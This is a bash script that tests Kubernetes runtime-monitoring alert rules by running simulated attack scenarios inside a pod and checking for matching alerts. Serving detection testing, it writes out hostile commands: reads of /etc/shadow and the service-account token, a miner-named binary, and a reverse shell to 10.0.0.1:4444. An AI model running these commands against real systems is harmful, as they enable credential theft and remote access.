#!/usr/bin/env bash
# scripts/verify-rtm-rules.sh
# Runs each RTM scenario, waits up to 20 s for the alert to appear in
# stub-receiver /alerts/recent, then prints a PASS/FAIL table.
# Exit 0 only when all rules PASS.
set -euo pipefail

NS="${SHOP_NS:-shop}"
WAIT="${VERIFY_WAIT_SECS:-20}"
PF_PORT="${PF_PORT:-18765}"
REPO_ROOT="$(cd "$(dirname "$0")/.." && pwd)"

# ── helpers ──────────────────────────────────────────────────────────────────
pick_pod() {
  kubectl get pods -n "${NS}" --field-selector=status.phase=Running \
    -o jsonpath='{range .items[*]}{.metadata.name}{"\n"}{end}' \
    | grep -v '^stub-receiver' | head -n 1
}

stub_pod() {
  kubectl get pods -n "${NS}" -l app=stub-receiver \
    -o jsonpath='{.items[0].metadata.name}'
}

# Start port-forward to stub-receiver in background
start_pf() {
  kubectl port-forward -n "${NS}" svc/stub-receiver "${PF_PORT}:8000" \
    >/dev/null 2>&1 &
  PF_PID=$!
  sleep 2   # wait for it to bind
}

stop_pf() { kill "${PF_PID}" 2>/dev/null || true; }

recent_ids() {
  curl -sf "http://127.0.0.1:${PF_PORT}/alerts/recent" \
    | python3 -c "
import sys, json
d = json.load(sys.stdin)
for a in d.get('alerts', []):
    print(a.get('rtm_id',''))
" 2>/dev/null | sort -u
}

flush_alerts() {
  # POST a dummy to make the server process in-flight requests, then wait
  sleep 1
}

wait_for_rule() {
  local id="$1"
  local deadline=$(( $(date +%s) + WAIT ))
  while [[ $(date +%s) -lt $deadline ]]; do
    if recent_ids | grep -q "^${id}$"; then
      return 0
    fi
    sleep 2
  done
  return 1
}

exec_scenario() {
  local id="$1"; local pod="$2"
  case "${id}" in
    RTM-001) kubectl exec -n "${NS}" "${pod}" -- sh -c 'echo hi' >/dev/null 2>&1 || true ;;
    RTM-002) kubectl exec -n "${NS}" "${pod}" -- cat /etc/shadow >/dev/null 2>&1 || true ;;
    RTM-003) kubectl exec -n "${NS}" "${pod}" -- sh -c \
               'cat /var/run/secrets/kubernetes.io/serviceaccount/token > /dev/null' \
               >/dev/null 2>&1 || true ;;
    RTM-004) kubectl exec -n "${NS}" "${pod}" -- pip --version >/dev/null 2>&1 || \
             kubectl exec -n "${NS}" "${pod}" -- apt-get --version >/dev/null 2>&1 || true ;;
    RTM-005) kubectl exec -n "${NS}" "${pod}" -- sh -c \
               'cp /bin/ls /tmp/vx && /tmp/vx /' >/dev/null 2>&1 || true ;;
    RTM-006) kubectl exec -n "${NS}" "${pod}" -- python3 -c \
               'import socket; s=socket.socket(); s.settimeout(3)
try: s.connect(("1.1.1.1",443)); s.close()
except: pass' >/dev/null 2>&1 || true ;;
    RTM-007) kubectl exec -n "${NS}" "${pod}" -- bash -c \
               'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' \
               >/dev/null 2>&1 || true ;;
    RTM-008) kubectl exec -n "${NS}" "${pod}" -- sh -c \
               'cp /bin/sleep /tmp/xmrig2 && /tmp/xmrig2 1' >/dev/null 2>&1 || true ;;
  esac
}

# ── main ─────────────────────────────────────────────────────────────────────
POD="$(pick_pod)"
[[ -n "${POD}" ]] || { echo "ERROR: no running shop pod" >&2; exit 1; }
echo "==> Target pod : ${NS}/${POD}"
echo "==> Wait secs  : ${WAIT}"
echo ""

start_pf
trap stop_pf EXIT

RULES=(RTM-001 RTM-002 RTM-003 RTM-004 RTM-005 RTM-006 RTM-007 RTM-008)
declare -A RESULT

for id in "${RULES[@]}"; do
  printf "Testing %-10s ... " "${id}"
  exec_scenario "${id}" "${POD}"
  flush_alerts
  if wait_for_rule "${id}"; then
    RESULT[$id]="PASS"
    echo "PASS"
  else
    RESULT[$id]="FAIL"
    echo "FAIL"
  fi
done

echo ""
echo "════════════════════════════════════"
echo " RTM Rule Verification Results"
echo "════════════════════════════════════"
FAILS=0
for id in "${RULES[@]}"; do
  printf "  %-10s  %s\n" "${id}" "${RESULT[$id]}"
  [[ "${RESULT[$id]}" == "PASS" ]] || FAILS=$(( FAILS + 1 ))
done
echo "════════════════════════════════════"
echo "  PASSED: $(( ${#RULES[@]} - FAILS ))/${#RULES[@]}   FAILED: ${FAILS}"
echo ""

[[ "${FAILS}" -eq 0 ]] || { echo "VERIFICATION FAILED"; exit 1; }
echo "VERIFICATION PASSED"
